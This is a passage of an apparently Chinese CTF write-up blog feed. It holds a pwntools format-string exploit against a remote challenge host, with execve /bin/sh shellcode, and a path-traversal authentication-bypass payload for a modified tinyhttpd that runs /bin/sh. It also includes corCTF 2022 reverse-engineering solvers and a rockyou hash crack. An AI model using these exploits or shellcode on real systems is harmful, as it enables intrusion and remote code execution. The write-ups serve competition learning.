class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># %%</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="hljs-string">"./fmt_patched"</span>)</span><br><span class="line">libc = ELF(<span class="hljs-string">"./libc.so.6"</span>)</span><br><span class="line">ld = ELF(<span class="hljs-string">"./ld-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line">context.os = <span class="hljs-string">"linux"</span></span><br><span class="line">context.arch = context.binary.arch</span><br><span class="line">context.terminal = [<span class="hljs-string">"konsole"</span>, <span class="hljs-string">"-e"</span>]</span><br><span class="line"><span class="hljs-comment"># context.terminal = ['wt.exe', 'wsl', '--']</span></span><br><span class="line"></span><br><span class="line">local = <span class="hljs-literal">False</span></span><br><span class="line"><span class="hljs-keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="hljs-string">"debug"</span></span><br><span class="line">    p = process([exe.path])</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    p = remote(<span class="hljs-string">"123.60.179.52"</span>,<span class="hljs-number">30110</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbgaddr</span>(<span class="hljs-params">addr, PIE=<span class="hljs-literal">False</span></span>):</span>  <span class="hljs-comment"># PIE enabled</span></span><br><span class="line">    <span class="hljs-keyword">if</span> local:</span><br><span class="line">        <span class="hljs-keyword">if</span> PIE:</span><br><span class="line">            text_base = <span class="hljs-built_in">int</span>(</span><br><span class="line">                os.popen(<span class="hljs-string">"pmap {}| awk '{{print $1}}'"</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">2</span>], <span class="hljs-number">16</span></span><br><span class="line">            )</span><br><span class="line">            log.info(<span class="hljs-string">f"b *<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(text_base + addr)}</span>\n"</span>)</span><br><span class="line">            gdb.attach(p, <span class="hljs-string">f"b *<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(text_base + addr)}</span>"</span>)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            gdb.attach(p, <span class="hljs-string">f"b *<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(addr)}</span>"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>(<span class="hljs-params">func=<span class="hljs-string">""</span></span>):</span></span><br><span class="line">    <span class="hljs-keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, func)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main_arena</span>():</span></span><br><span class="line">    <span class="hljs-comment"># from ptrlib</span></span><br><span class="line">    ofs_stdin = libc.sym._IO_2_1_stdin_</span><br><span class="line">    ofs_realloc_hook = libc.sym.__realloc_hook</span><br><span class="line">    ofs_malloc_hook = libc.sym.__malloc_hook</span><br><span class="line">    <span class="hljs-keyword">if</span> ofs_realloc_hook <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> ofs_malloc_hook <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> ofs_stdin <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt; ofs_malloc_hook - ofs_stdin &lt; <span class="hljs-number">0x1000</span>:</span><br><span class="line">        <span class="hljs-comment"># libc-2.33 or older</span></span><br><span class="line">        <span class="hljs-keyword">if</span> context.bits == <span class="hljs-number">32</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ofs_malloc_hook + <span class="hljs-number">0x18</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ofs_malloc_hook + (ofs_malloc_hook - ofs_realloc_hook) * <span class="hljs-number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-comment"># libc-2.34 removed hooks</span></span><br><span class="line">        ofs_tzname = libc.sym.tzname</span><br><span class="line">        <span class="hljs-keyword">if</span> ofs_tzname <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br><span class="line">        <span class="hljs-keyword">if</span> context.bits == <span class="hljs-number">32</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ofs_tzname - <span class="hljs-number">0x460</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ofs_tzname - <span class="hljs-number">0x8A0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ROL</span>(<span class="hljs-params">content, key</span>):</span></span><br><span class="line">    <span class="hljs-comment"># house of emma</span></span><br><span class="line">    <span class="hljs-comment"># ROL(gadget_addr ^ fake_pointer_guard, 0x11)</span></span><br><span class="line">    tmp = <span class="hljs-built_in">bin</span>(content)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">64</span>, <span class="hljs-string">"0"</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(tmp[key:] + tmp[:key], <span class="hljs-number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dbgaddr(<span class="hljs-number">0x1340</span>, PIE=<span class="hljs-literal">True</span>)</span><br><span class="line"><span class="hljs-comment"># dbg("run")</span></span><br><span class="line"></span><br><span class="line">s = <span class="hljs-keyword">lambda</span> <span class="hljs-built_in">str</span>: p.send(<span class="hljs-built_in">str</span>)</span><br><span class="line">sl = <span class="hljs-keyword">lambda</span> <span class="hljs-built_in">str</span>: p.sendline(<span class="hljs-built_in">str</span>)</span><br><span class="line">sa = <span class="hljs-keyword">lambda</span> delims, <span class="hljs-built_in">str</span>: p.sendafter(delims, <span class="hljs-built_in">str</span>)</span><br><span class="line">sla = <span class="hljs-keyword">lambda</span> delims, <span class="hljs-built_in">str</span>: p.sendlineafter(delims, <span class="hljs-built_in">str</span>)</span><br><span class="line">r = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>: p.recv(numb)</span><br><span class="line">rl = <span class="hljs-keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>: p.recvuntil(delims, drop)</span><br><span class="line">uu32 = <span class="hljs-keyword">lambda</span> data: u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b"\x00"</span>))</span><br><span class="line">uu64 = <span class="hljs-keyword">lambda</span> data: u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b"\x00"</span>))</span><br><span class="line">li = <span class="hljs-keyword">lambda</span> <span class="hljs-built_in">str</span>, data: log.success(<span class="hljs-built_in">str</span> + <span class="hljs-string">"========&gt;"</span> + <span class="hljs-built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># https://www.exploit-db.com/shellcodes</span></span><br><span class="line">execve_bin_sh = <span class="hljs-string">b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span><br><span class="line">execveat_bin_sh = <span class="hljs-string">b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"</span></span><br><span class="line">cat_flag = <span class="hljs-string">b"\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x67\x6d\x60\x66\x01\x01\x01\x48\x31\x04\x24\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"</span></span><br><span class="line">ls_current_dir = <span class="hljs-string">b"\x68\x2f\x2e\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\x89\xe7\x31\xd2\xbe\x01\x01\x02\x01\x81\xf6\x01\x01\x03\x01\x6a\x02\x58\x0f\x05\x48\x89\xc7\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x4e\x58\x0f\x05\x6a\x01\x5f\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x01\x58\x0f\x05"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># %%</span></span><br><span class="line">sla(<span class="hljs-string">"str: "</span>, <span class="hljs-string">"%14$p|%8$p"</span>)</span><br><span class="line"><span class="hljs-comment"># print(rl())</span></span><br><span class="line">stack = ru(<span class="hljs-string">"|"</span>)[<span class="hljs-number">2</span>:]</span><br><span class="line"><span class="hljs-comment"># print(stack)</span></span><br><span class="line">target = <span class="hljs-built_in">int</span>(stack, <span class="hljs-number">16</span>) + <span class="hljs-number">8</span></span><br><span class="line">libc = <span class="hljs-built_in">int</span>(rl()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">0x1e94a0</span></span><br><span class="line">li(<span class="hljs-string">"ret addr"</span>, target)</span><br><span class="line">li(<span class="hljs-string">"libc"</span>, libc)</span><br><span class="line">one=libc+<span class="hljs-number">0xe3b01</span></span><br><span class="line">li(<span class="hljs-string">"gadget"</span>,one)</span><br><span class="line">payload=fmtstr_payload(<span class="hljs-number">6</span>,{target:one},<span class="hljs-number">0</span>,<span class="hljs-string">'short'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))</span><br><span class="line">sla(<span class="hljs-string">"str: "</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># %%</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="ezhttpd"><a href="#ezhttpd" class="headerlink" title="ezhttpd"></a>ezhttpd</h2><p>tinyhttpd魔改的一个httpd服务，只接受GET和POST，但是需要身份验证，解base64时存在溢出，可以覆写url，绕过之前对<code>..</code>的检测，密码是随机数无法绕过，但是当url里面存在<code>.css</code>、<code>.html</code>等字符串时可以直接验证通过，漏洞利用的位置在cgi执行，判断url存在且可执行，就会执行对应的文件，<code>?</code>会进行截断，将<code>.css</code>放在<code>?</code>后面，可以通过验证，也不影响对于文件存在性的判断。</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sl(<span class="hljs-string">"GET /a.css"</span>)</span><br><span class="line">sl(</span><br><span class="line">    <span class="hljs-string">b"Authorization: Basic "</span></span><br><span class="line">    + base64.b64encode(</span><br><span class="line">        <span class="hljs-string">b"admin:"</span></span><br><span class="line">        + <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x40</span> - <span class="hljs-number">6</span>)</span><br><span class="line">        + <span class="hljs-string">b"/../../../../../../../../../../../../../../../../bin/sh?.css"</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line">sl(<span class="hljs-string">""</span>)</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/07/04/hello-world/"/>
      <url>/2023/07/04/hello-world/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>My first post to say “Hello”.</p></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>corctf2022_wp</title>
      <link href="/2022/08/09/corctf2022-wp/"/>
      <url>/2022/08/09/corctf2022-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>比赛质量很高，可惜只做了一天，第二天有事出去了一天，再做题的时候发现已经结束了，后面的题目复现的时候慢慢加上。</p><span id="more"></span><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Microsoft-❤️-Linux"><a href="#Microsoft-❤️-Linux" class="headerlink" title="Microsoft ❤️ Linux"></a>Microsoft ❤️ Linux</h2><p>这题比较简单但是很有意思。</p><p>先用IDA打开，发现是一个32位的ELF文件，做了一个循环左移，但是对一个8bit数左移13位很奇怪</p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> __noreturn <span class="hljs-title">start</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// esi</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span></span><br><span class="line"></span><br><span class="line">  __asm { <span class="hljs-keyword">int</span>     <span class="hljs-number">80</span>h; LINUX - }</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i != <span class="hljs-number">18</span>; LOWORD(i) = i + <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( __ROL1__(byte_100111[i], <span class="hljs-number">13</span>) != byte_100210[i] )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_6;</span><br><span class="line">  }</span><br><span class="line">  word_100234 = <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_6:</span><br><span class="line">  <span class="hljs-keyword">if</span> ( word_100234 == <span class="hljs-number">1</span> )</span><br><span class="line">    v2 = sys_write(<span class="hljs-number">1</span>, &amp;off_1002AE, <span class="hljs-number">0x62</span>u);</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    v1 = sys_write(<span class="hljs-number">1</span>, &amp;off_100310, <span class="hljs-number">0xD</span>u);</span><br><span class="line">  v3 = sys_exit(<span class="hljs-number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>解出来只有一半的flag，按照提示尝试windows下不能直接运行，有可能是DOS，用ghidra打开，调成16bit解析，发现是异或</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000:00d6 83  fe  12       CMP        SI,0x12</span><br><span class="line">0000:00d9 74  11           JZ         LAB_0000_00ec</span><br><span class="line">0000:00db 8a  84  13  02    MOV        AL,byte ptr [SI + 0x213 ]</span><br><span class="line">0000:00df 34  0d           XOR        AL,0xd</span><br><span class="line">0000:00e1 8a  9c  22  03    MOV        BL,byte ptr [SI + 0x322 ]</span><br><span class="line">0000:00e5 38  d8           CMP        AL,BL</span><br><span class="line">0000:00e7 75  09           JNZ        LAB_0000_00f2</span><br><span class="line">0000:00e9 46              INC        SI</span><br><span class="line">0000:00ea eb  ea           JMP        LAB_0000_00d6</span><br></pre></td></tr></tbody></table></figure><p>正好异或的是13，和前面对应</p><figure class="highlight go hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {</span><br><span class="line">s := []<span class="hljs-keyword">byte</span>{</span><br><span class="line"><span class="hljs-number">0x6c</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x66</span>,</span><br><span class="line"><span class="hljs-number">0x0f</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x65</span>,</span><br><span class="line"><span class="hljs-number">0x2c</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x70</span>,</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">for</span> i, c := <span class="hljs-keyword">range</span> s {</span><br><span class="line"><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">18</span> {</span><br><span class="line">low := c &gt;&gt; <span class="hljs-number">5</span> &amp; <span class="hljs-number">0xff</span></span><br><span class="line">high := c &lt;&lt; <span class="hljs-number">3</span> &amp; <span class="hljs-number">0xff</span></span><br><span class="line">fmt.Printf(<span class="hljs-string">"%c"</span>, low|high)</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">fmt.Printf(<span class="hljs-string">"%c"</span>, c^<span class="hljs-number">0xd</span>)</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//fmt.Println(s)</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="turbocrab"><a href="#turbocrab" class="headerlink" title="turbocrab"></a>turbocrab</h2><p>rust题，用Iced_x86跑了一段代码，前面的部分都可以直接调试过去，直接找到执行的部分，仅仅是进行了一些简单的操作，唯一的问题在于存在多解的可能，要慢慢调整</p><figure class="highlight go hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> <span class="hljs-string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {</span><br><span class="line">s := <span class="hljs-string">"R^CRIWJM&lt;6.[5I.G`.C3G3CB5_V?P0"</span></span><br><span class="line">alphabet := <span class="hljs-string">"{}_!.,-=+;':\"&lt;&gt;/?0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line"><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> s {</span><br><span class="line"><span class="hljs-keyword">for</span> _, ch := <span class="hljs-keyword">range</span> alphabet {</span><br><span class="line"><span class="hljs-keyword">var</span> tmpRes <span class="hljs-keyword">byte</span></span><br><span class="line"><span class="hljs-keyword">var</span> tmpCh = <span class="hljs-keyword">byte</span>(ch)</span><br><span class="line"><span class="hljs-keyword">if</span> tmpCh &lt;= <span class="hljs-number">0x80</span> {</span><br><span class="line">tmpCh = (tmpCh ^ <span class="hljs-number">0x13</span>) - <span class="hljs-number">30</span></span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">tmpCh = (tmpCh ^ <span class="hljs-number">0x24</span>) - <span class="hljs-number">30</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">if</span> tmpCh &lt;= <span class="hljs-number">16</span> {</span><br><span class="line">tmpRes = tmpCh ^ <span class="hljs-number">0x31</span></span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">tmpRes = tmpCh</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">if</span> tmpRes == <span class="hljs-keyword">byte</span>(c) {</span><br><span class="line">fmt.Printf(<span class="hljs-string">"%c"</span>, ch)</span><br><span class="line"><span class="hljs-keyword">break</span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="hackermans-dungeon"><a href="#hackermans-dungeon" class="headerlink" title="hackermans dungeon"></a>hackermans dungeon</h2><p>这题赛后复现的，比赛的时候都逆完了但是没什么解决思路，赛后发现就是crack一个sha256的hash</p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">int</span>)v17 &gt; <span class="hljs-number">0</span> )</span><br><span class="line">{</span><br><span class="line">  v18 = <span class="hljs-number">0</span>i64;</span><br><span class="line">  <span class="hljs-keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    ++passwd[v18];</span><br><span class="line">    v19 = v5 % (<span class="hljs-keyword">int</span>)v17;</span><br><span class="line">    ++v5;</span><br><span class="line">    passwd[v18] = ~((passwd[v19] ^ passwd[v18]) + <span class="hljs-number">98</span>);</span><br><span class="line">    ++v18;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">while</span> ( v18 &lt; (<span class="hljs-keyword">int</span>)v17 );</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>首先对输入有一个编码，然后就是一通md5,sha256,chacha20,crc32的操作，在这里卡了很久因为根本求解不出来，赛后看到直接对sha256跑一个字典，非常常用的<code>rockyou.txt</code>就可以了，试了一下，直接就可以解出来。</p><figure class="highlight go hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> (</span><br><span class="line"><span class="hljs-string">"bufio"</span></span><br><span class="line"><span class="hljs-string">"crypto/sha256"</span></span><br><span class="line"><span class="hljs-string">"encoding/hex"</span></span><br><span class="line"><span class="hljs-string">"fmt"</span></span><br><span class="line"><span class="hljs-string">"io"</span></span><br><span class="line"><span class="hljs-string">"os"</span></span><br><span class="line"><span class="hljs-string">"strings"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sha256</span><span class="hljs-params">(src <span class="hljs-keyword">string</span>)</span> <span class="hljs-title">string</span></span> {</span><br><span class="line">m := sha256.New()</span><br><span class="line">m.Write([]<span class="hljs-keyword">byte</span>(src))</span><br><span class="line">res := hex.EncodeToString(m.Sum(<span class="hljs-literal">nil</span>))</span><br><span class="line"><span class="hljs-keyword">return</span> res</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handle</span><span class="hljs-params">(s []<span class="hljs-keyword">byte</span>)</span> []<span class="hljs-title">byte</span></span> {</span><br><span class="line"><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(s); i++ {</span><br><span class="line">tmpI := (i + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(s)</span><br><span class="line">s[i] = ^(((s[i] + <span class="hljs-number">1</span>) ^ s[tmpI]) + <span class="hljs-number">98</span>)</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">return</span> s</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {</span><br><span class="line">wordlist, err := os.Open(<span class="hljs-string">"rockyou.txt"</span>)</span><br><span class="line">shaRes := strings.ToLower(<span class="hljs-string">"9C00F1AC636216E2342F64AE3B82E3C02749A69C35DF8C03554D55C101869D47"</span>)</span><br><span class="line"><span class="hljs-comment">//fmt.Println(sha_res)</span></span><br><span class="line"><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line"><span class="hljs-keyword">return</span></span><br><span class="line">}</span><br><span class="line">fp := bufio.NewReader(wordlist)</span><br><span class="line"><span class="hljs-keyword">for</span> {</span><br><span class="line">b, _, err := fp.ReadLine()</span><br><span class="line"><span class="hljs-keyword">if</span> err == io.EOF {</span><br><span class="line"><span class="hljs-keyword">break</span></span><br><span 